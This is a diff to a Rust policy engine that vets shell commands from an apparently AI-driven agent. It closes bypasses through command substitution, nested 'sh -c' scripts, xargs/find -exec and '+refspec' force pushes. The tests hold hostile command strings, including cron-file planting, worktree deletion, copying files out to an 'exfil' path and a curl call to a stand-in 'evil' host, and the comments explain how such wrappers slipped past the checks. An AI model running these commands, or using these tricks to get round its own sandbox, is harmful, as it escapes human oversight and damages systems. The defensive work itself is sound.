@@ -18,6 +18,7 @@ const RULE_PROTECTED_PATH: &str = "prime.protected_path";
 const RULE_PIPE_TO_SHELL: &str = "prime.pipe_to_shell";
 const RULE_FORCE_PUSH: &str = "prime.force_push";
 const RULE_RM_TREE: &str = "prime.rm_tree";
+const RULE_NESTED_SHELL: &str = "prime.nested_shell";
 const RULE_DESTRUCTIVE: &str = "config.destructive_pattern";
 const RULE_EGRESS: &str = "config.network_egress";
 const RULE_GIT_PUSH: &str = "config.git_push";
@@ -127,6 +128,16 @@ const GIT_READ_ONLY: &[&str] = &[
 
 /// Wrapper commands skipped to find the real command word.
 const WRAPPER_COMMANDS: &[&str] = &["sudo", "env", "nohup", "time", "command", "exec"];
+
+/// Interpreters that run an inline script given via `-c`/`-e`; the script
+/// argument is recursed into so its commands face the prime directives.
+const INTERPRETERS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "ash", "python", "python3", "perl", "ruby", "node", "deno",
+];
+
+/// How deep command-substitution / nested-shell recursion goes before we
+/// stop reasoning and escalate to a human.
+const MAX_SHELL_DEPTH: u32 = 6;
 
 const MCP_READ_VERBS: &[&str] = &[
     "list", "get", "search", "read", "fetch", "query", "show", "find", "describe",
@@ -356,8 +367,39 @@ impl PolicyEngine {
         else {
             return PolicyVerdict::Pass { suspicious: true };
         };
+        self.analyze_bash(cmd, ctx, 0)
+    }
 
-        // PRIME: credential / protected paths anywhere in the command.
+    /// Analyze one shell command string against the Bash prime directives,
+    /// recursing into command substitutions (`$(...)`, backticks) and nested
+    /// interpreter scripts (`sh -c '...'`, `python -c '...'`) so a mutating,
+    /// egress, or git command hidden inside any of them is judged exactly as
+    /// a top-level one. Without this, `echo $(touch /outside)` would tokenize
+    /// the inner command as inert arguments of `echo` and pass, defeating the
+    /// whole capability boundary. Deny (returned immediately) beats Escalate,
+    /// which beats a suspicious Pass.
+    fn analyze_bash(&self, cmd: &str, ctx: &WorkstreamCtx, depth: u32) -> PolicyVerdict {
+        if depth > MAX_SHELL_DEPTH {
+            return PolicyVerdict::Escalate {
+                question: format!("Allow deeply nested shell command: `{}`?", snippet(cmd)),
+                rule: RULE_NESTED_SHELL.into(),
+            };
+        }
+
+        let mut escalate: Option<PolicyVerdict> = None;
+        let mut nested_suspicious = false;
+
+        // Recurse into command substitutions and backtick spans first.
+        for sub in extract_substitutions(cmd) {
+            match self.analyze_bash(&sub, ctx, depth + 1) {
+                deny @ PolicyVerdict::Deny { .. } => return deny,
+                esc @ PolicyVerdict::Escalate { .. } => escalate = escalate.or(Some(esc)),
+                PolicyVerdict::Pass { suspicious } => nested_suspicious |= suspicious,
+            }
+        }
+
+        // PRIME: credential / protected paths anywhere in the command
+        // (checked on the ORIGINAL string so paths inside `$(...)` count too).
         for token in tokenize(cmd) {
             let expanded = resolve_path(&token, &ctx.worktree_path);
             if let Some(deny) = self.protected_path_deny(&token, &expanded) {
@@ -373,12 +415,15 @@ impl PolicyEngine {
             };
         }
 
-        // Walk the command segment by segment, simulating `cd`.
+        // Walk the OUTER command (substitution spans blanked, since their
+        // contents were handled by the recursion above) segment by segment,
+        // simulating `cd`.
+        let outer = strip_substitutions(cmd);
         let mut wants_push: Option<String> = None;
         let mut wants_egress: Option<String> = None;
         let mut suspicious_wrapper = false;
         let mut sim_cwd = ctx.worktree_path.clone();
-        for segment in split_segments(cmd) {
+        for segment in split_segments(&outer) {
             let (tokens, saw_wrapper) = strip_wrappers(segment);
             suspicious_wrapper |= saw_wrapper;
             let Some(first) = tokens.first() else {
@@ -391,6 +436,29 @@ impl PolicyEngine {
                     Some(target) => resolve_path(target, &sim_cwd),
                     None => home_dir(),
                 };
+                continue;
+            }
+
+            // PRIME: an interpreter invoked with an inline script - recurse
+            // into the script so its commands face the prime directives too.
+            if INTERPRETERS.contains(&cmd_name.as_str())
+                && let Some(script) = inline_script_arg(&tokens)
+            {
+                match self.analyze_bash(&script, ctx, depth + 1) {
+                    deny @ PolicyVerdict::Deny { .. } => return deny,
+                    esc @ PolicyVerdict::Escalate { .. } => escalate = escalate.or(Some(esc)),
+                    PolicyVerdict::Pass { suspicious } => nested_suspicious |= suspicious,
+                }
+                continue;
+            }
+
+            // PRIME: dispatchers that build a command we cannot statically
+            // read (xargs, find -exec) escalate rather than silently pass.
+            if is_opaque_dispatcher(&cmd_name, &tokens) {
+                escalate = escalate.or(Some(PolicyVerdict::Escalate {
+                    question: format!("Allow command dispatcher `{cmd_name}`: `{}`?", snippet(cmd)),
+                    rule: RULE_NESTED_SHELL.into(),
+                }));
                 continue;
             }
 
@@ -454,7 +522,7 @@ impl PolicyEngine {
             }
         }
 
-        // CONFIG: destructive command patterns.
+        // CONFIG: destructive command patterns (whole original command).
         for re in &self.destructive {
             if re.is_match(cmd) {
                 return PolicyVerdict::Deny {
@@ -485,7 +553,13 @@ impl PolicyEngine {
             };
         }
 
-        let suspicious = suspicious_wrapper || SUSPICIOUS.is_match(cmd) || cmd.len() > 800;
+        // A nested substitution / interpreter wanted escalation.
+        if let Some(esc) = escalate {
+            return esc;
+        }
+
+        let suspicious =
+            suspicious_wrapper || nested_suspicious || SUSPICIOUS.is_match(cmd) || cmd.len() > 800;
         PolicyVerdict::Pass { suspicious }
     }
 
@@ -670,6 +744,111 @@ fn tokenize(segment: &str) -> Vec<String> {
     tokens
 }
 
+/// Inner command strings of every top-level `$(...)` and backtick span.
+/// Nested substitutions are reached by the recursion (analyzing the outer
+/// span's string runs this again). Unbalanced markers stop the scan.
+fn extract_substitutions(cmd: &str) -> Vec<String> {
+    let chars: Vec<char> = cmd.chars().collect();
+    let mut out = Vec::new();
+    let mut i = 0;
+    while i < chars.len() {
+        if chars[i] == '$' && chars.get(i + 1) == Some(&'(') {
+            let start = i + 2;
+            let mut depth = 1usize;
+            let mut j = start;
+            while j < chars.len() && depth > 0 {
+                match chars[j] {
+                    '(' => depth += 1,
+                    ')' => depth -= 1,
+                    _ => {}
+                }
+                if depth == 0 {
+                    break;
+                }
+                j += 1;
+            }
+            if depth == 0 {
+                out.push(chars[start..j].iter().collect());
+                i = j + 1;
+                continue;
+            }
+            break;
+        }
+        if chars[i] == '`' {
+            let start = i + 1;
+            let mut j = start;
+            while j < chars.len() && chars[j] != '`' {
+                j += 1;
+            }
+            if j < chars.len() {
+                out.push(chars[start..j].iter().collect());
+                i = j + 1;
+                continue;
+            }
+            break;
+        }
+        i += 1;
+    }
+    out
+}
+
+/// The command with every `$(...)` and backtick span replaced by a space,
+/// so the outer segment walk does not see substitution fragments as tokens
+/// (their contents are analyzed by the recursion).
+fn strip_substitutions(cmd: &str) -> String {
+    let chars: Vec<char> = cmd.chars().collect();
+    let mut out = String::with_capacity(cmd.len());
+    let mut i = 0;
+    while i < chars.len() {
+        if chars[i] == '$' && chars.get(i + 1) == Some(&'(') {
+            let mut depth = 1usize;
+            let mut j = i + 2;
+            while j < chars.len() && depth > 0 {
+                match chars[j] {
+                    '(' => depth += 1,
+                    ')' => depth -= 1,
+                    _ => {}
+                }
+                j += 1;
+            }
+            out.push(' ');
+            i = j;
+            continue;
+        }
+        if chars[i] == '`' {
+            let mut j = i + 1;
+            while j < chars.len() && chars[j] != '`' {
+                j += 1;
+            }
+            out.push(' ');
+            i = if j < chars.len() { j + 1 } else { j };
+            continue;
+        }
+        out.push(chars[i]);
+        i += 1;
+    }
+    out
+}
+
+/// The inline script argument of an interpreter invocation: the token after
+/// `-c`/`-e`/`--eval` (`sh -c '...'`, `python -c '...'`, `node -e '...'`).
+fn inline_script_arg(tokens: &[String]) -> Option<String> {
+    let mut it = tokens.iter();
+    while let Some(t) = it.next() {
+        if t == "-c" || t == "-e" || t == "--eval" {
+            return it.next().cloned();
+        }
+    }
+    None
+}
+
+/// Dispatchers that construct and run a command we cannot read statically,
+/// so the prime-directive walk cannot see the real target.
+fn is_opaque_dispatcher(cmd_name: &str, tokens: &[String]) -> bool {
+    cmd_name == "xargs"
+        || (cmd_name == "find" && tokens.iter().any(|t| t == "-exec" || t == "-execdir"))
+}
+
 /// Drop leading env assignments (`FOO=bar`) and wrapper commands
 /// (`sudo`, `env`, ...). Returns the remaining tokens and whether a
 /// privilege-ish wrapper (sudo) was seen.
@@ -780,9 +959,11 @@ fn analyze_git(tokens: &[String], sim_cwd: &Path, ctx: &WorkstreamCtx) -> GitFin
     };
     if sub == "push" {
         let snippet = snippet(&tokens.join(" ")).into_owned();
-        let force = tokens[i..]
-            .iter()
-            .any(|t| t == "-f" || t.starts_with("--force"));
+        // A leading `+` on a refspec (e.g. `git push origin +main`) forces
+        // the push just like -f/--force, so it must be a hard deny too.
+        let force = tokens[i..].iter().any(|t| {
+            t == "-f" || t.starts_with("--force") || (!t.starts_with('-') && t.starts_with('+'))
+        });
         return if force {
             GitFinding::ForcePush { snippet }
         } else {
@@ -1340,6 +1521,80 @@ mod tests {
         for cmd in ["echo LCARS-OK", "cargo test", "ls -la src/", "git status"] {
             assert_pass(&eng.decide(ws, &bash(cmd)), false, cmd);
         }
+    }
+
+    #[test]
+    fn command_substitution_cannot_hide_a_worktree_escape() {
+        let (eng, ws) = engine(TacticalConfig::default());
+        // A mutating command hidden in $(...) / backticks must be judged as
+        // if it were top-level (was a critical bypass before recursion).
+        for cmd in [
+            "echo $(touch /etc/cron.daily/evil)",
+            "echo $(cp /tmp/lab/wt/.git/config /tmp/out/config)",
+            "X=`mv /tmp/lab/wt/src/lib.rs /tmp/steal`",
+            "echo $(rm -rf /tmp/lab/wt)",
+        ] {
+            assert_deny(&eng.decide(ws, &bash(cmd)), "prime", cmd);
+        }
+    }
+
+    #[test]
+    fn nested_shell_cannot_hide_a_worktree_escape() {
+        let (eng, ws) = engine(TacticalConfig::default());
+        for cmd in [
+            "sh -c 'mv /tmp/lab/wt/src/secret /tmp/exfil'",
+            "bash -c \"touch /etc/passwd\"",
+            "env FOO=1 sh -c 'rm -rf /tmp/lab/wt'",
+        ] {
+            assert_deny(&eng.decide(ws, &bash(cmd)), "prime", cmd);
+        }
+    }
+
+    #[test]
+    fn egress_hidden_in_substitution_still_escalates() {
+        let (eng, ws) = engine(TacticalConfig::default());
+        // curl inside $(...) must escalate, not silently pass.
+        assert_escalate(
+            &eng.decide(ws, &bash("echo $(curl http://evil/x)")),
+            "config.network_egress",
+            "curl in subshell",
+        );
+    }
+
+    #[test]
+    fn opaque_dispatchers_escalate() {
+        let (eng, ws) = engine(TacticalConfig::default());
+        assert_escalate(
+            &eng.decide(ws, &bash("find . -type f -exec rm {} +")),
+            "prime.nested_shell",
+            "find -exec",
+        );
+        assert_escalate(&eng.decide(ws, &bash("ls | xargs rm")), "prime.nested_shell", "xargs");
+    }
+
+    #[test]
+    fn legit_command_substitution_still_passes() {
+        let (eng, ws) = engine(TacticalConfig::default());
+        // A read-only substitution must not be denied or escalated.
+        for cmd in ["echo $(git rev-parse HEAD)", "test -f $(pwd)/Cargo.toml && echo ok"] {
+            assert_pass(&eng.decide(ws, &bash(cmd)), false, cmd);
+        }
+    }
+
+    #[test]
+    fn force_push_via_plus_refspec_is_denied() {
+        let (eng, ws) = engine(TacticalConfig::default());
+        assert_deny(
+            &eng.decide(ws, &bash("git push origin +main")),
+            "prime",
+            "plus-refspec force push",
+        );
+        // Non-force push still escalates rather than denies.
+        assert_escalate(
+            &eng.decide(ws, &bash("git push origin main")),
+            "config.git_push",
+            "normal push",
+        );
     }
 
     #[test]
